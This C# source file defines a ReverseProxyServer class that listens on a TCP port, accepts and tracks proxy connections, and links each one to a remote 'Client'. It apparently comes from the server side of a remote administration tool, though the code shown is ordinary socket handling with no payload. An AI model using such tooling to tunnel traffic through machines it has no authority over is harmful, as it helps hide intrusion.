using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;

namespace xServer.Core.ReverseProxy
{
    public class ReverseProxyServer
    {
        public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);

        public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);

        public event ConnectionEstablishedCallback OnConnectionEstablished;
        public event UpdateConnectionCallback OnUpdateConnection;

        private Socket _socket;
        private List<ReverseProxyClient> _clients;

        public ReverseProxyClient[] Clients
        {
            get
            {
                lock (_clients)
                {
                    return _clients.ToArray();
                }
            }
        }

        public ReverseProxyClient[] OpenConnections
        {
            get
            {
                lock (_clients)
                {
                    List<ReverseProxyClient> temp = new List<ReverseProxyClient>();

                    for (int i = 0; i < _clients.Count; i++)
                    {
                        if (_clients[i].ProxySuccessful)
                        {
                            temp.Add(_clients[i]);
                        }
                    }
                    return temp.ToArray();
                }
            }
        }


        public Client Client { get; private set; }

        public ReverseProxyServer()
        {
            _clients = new List<ReverseProxyClient>();
        }

        public void StartServer(Client client, string ipAddress, int port)
        {
            Stop();

            this.Client = client;
            this.Client.Value.ProxyServer = this;

            this._socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            this._socket.Bind(new IPEndPoint(IPAddress.Parse(ipAddress), port));
            this._socket.Listen(100);
            this._socket.BeginAccept(socket_BeginAccept, null);
        }

        private void socket_BeginAccept(IAsyncResult ar)
        {
            try
            {
                lock (_clients)
                {
                    _clients.Add(new ReverseProxyClient(Client, this._socket.EndAccept(ar), this));
                }
            }
            catch
            {
            }

            try
            {
                this._socket.BeginAccept(socket_BeginAccept, null);
            }
            catch
            {
                /* Server stopped listening */
            }
        }

        public void Stop()
        {
            if (_socket != null)
                _socket.Close();

            lock (_clients)
            {
                foreach (ReverseProxyClient client in new List<ReverseProxyClient>(_clients))
                    client.Disconnect();
                _clients.Clear();
            }
        }

        public ReverseProxyClient GetClientByConnectionId(int connectionId)
        {
            lock (_clients)
            {
                for (int i = 0; i < _clients.Count; i++)
                {
                    if (_clients[i].ConnectionId == connectionId)
                        return _clients[i];
                }
                return null;
            }
        }

        internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
        {
            try
            {
                if (OnConnectionEstablished != null)
                    OnConnectionEstablished(proxyClient);
            }
            catch
            {
            }
        }

        internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
        {
            //remove a client that has been disconnected
            try
            {
                if (!proxyClient.IsConnected)
                {
                    lock (_clients)
                    {
                        for (int i = 0; i < _clients.Count; i++)
                        {
                            if (_clients[i].ConnectionId == proxyClient.ConnectionId)
                            {
                                _clients.RemoveAt(i);
                                break;
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            try
            {
                if (OnUpdateConnection != null)
                    OnUpdateConnection(proxyClient);
            }
            catch
            {
            }
        }
    }
}